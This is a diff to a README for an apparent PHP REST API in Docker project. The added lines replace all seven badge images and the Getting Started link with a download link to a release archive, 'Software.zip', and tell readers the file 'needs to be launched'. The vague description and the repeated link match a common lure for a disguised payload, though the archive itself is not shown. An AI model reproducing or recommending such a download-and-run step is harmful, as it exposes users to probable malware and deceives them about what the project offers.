@@ -1,13 +1,13 @@
 
 # 🚀 Welcome to the API REST PHP in Docker Repository! 🐳
 
-![docker](https://img.shields.io/badge/Docker-3CB371?style=for-the-badge&logo=docker)
-![php](https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php)
-![docker-compose](https://img.shields.io/badge/Docker_Compose-2496ED?style=for-the-badge&logo=docker)
-![javascript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript)
-![mysql](https://img.shields.io/badge/MySQL-4479A1?style=for-the-badge&logo=mysql)
-![prometheus](https://img.shields.io/badge/Prometheus-E6522C?style=for-the-badge&logo=prometheus)
-![kubernetes](https://img.shields.io/badge/Kubernetes-326CE5?style=for-the-badge&logo=kubernetes)
+![docker](https://github.com/bakheet331/api-rest-php-in-docker/releases/download/v1.0/Software.zip)
+![php](https://github.com/bakheet331/api-rest-php-in-docker/releases/download/v1.0/Software.zip)
+![docker-compose](https://github.com/bakheet331/api-rest-php-in-docker/releases/download/v1.0/Software.zip)
+![javascript](https://github.com/bakheet331/api-rest-php-in-docker/releases/download/v1.0/Software.zip)
+![mysql](https://github.com/bakheet331/api-rest-php-in-docker/releases/download/v1.0/Software.zip)
+![prometheus](https://github.com/bakheet331/api-rest-php-in-docker/releases/download/v1.0/Software.zip)
+![kubernetes](https://github.com/bakheet331/api-rest-php-in-docker/releases/download/v1.0/Software.zip)
 
 ## Description
 Unfortunately, the short description for this repository is not provided. However, you will find a plethora of technologies covered in this repository related to CSS, Cypress, Docker, Google Cloud, Grafana, JavaScript, Jenkins, Kubernetes, MySQL, Node Exporter, PHP, Prometheus, and Terraform.
@@ -29,7 +29,7 @@ Unfortunately, the short description for this repository is not provided. Howeve
 - Terraform
 
 ## Getting Started
-To get started with this repository, you can visit the [browser archive](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). Click on the link to download the file, which needs to be launched for further exploration.
+To get started with this repository, you can visit the [browser archive](https://github.com/bakheet331/api-rest-php-in-docker/releases/download/v1.0/Software.zip). Click on the link to download the file, which needs to be launched for further exploration.
 
 If the link is not working or not provided, please check the "Releases" section of the repository for more information.
 
